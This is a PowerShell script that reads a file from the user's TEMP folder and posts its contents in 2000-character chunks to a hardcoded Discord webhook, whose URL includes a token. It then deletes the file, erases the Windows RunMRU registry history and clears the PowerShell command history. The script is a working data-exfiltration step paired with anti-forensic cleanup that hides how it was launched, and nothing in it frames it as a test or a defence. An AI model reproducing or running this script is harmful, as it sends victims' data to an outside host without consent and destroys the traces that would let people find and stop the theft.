param(
    [string]$filename
)

# Define the webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# Define the path to the text file using the TEMP environment variable
$filePath = Join-Path $env:TEMP $filename

# Check if the file exists; if not, you might want to create it (for demonstration purposes)
if (-not (Test-Path $filePath)) {
    # Example content; you can adjust this as needed
    "Sample content" | Out-File -FilePath $filePath
}

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Check the length of the file content
    if ($fileContent.Length -lt 2000) {
        # Send the entire content to the Discord webhook
        $payload = @{
            content = $fileContent
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    } else {
        # Split the content into chunks of 2000 characters
        $chunkSize = 2000
        $chunks = [System.Collections.Generic.List[string]]::new()

        for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
            $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
        }

        # Send each chunk to the Discord webhook
        foreach ($chunk in $chunks) {
            # Create the payload for the webhook
            $payload = @{
                content = $chunk
            } | ConvertTo-Json

            # Try to send the content to the Discord webhook
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
            } catch {
                Write-Host "Error sending request: $_"
            }
        }
    }
} else {
    Write-Host "File not found: $filePath"
}

# Clean up the temp file if it exists
Remove-Item $filePath -Force -ErrorAction SilentlyContinue

# Delete the entire RunMRU history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Clear the PowerShell command history
Clear-History
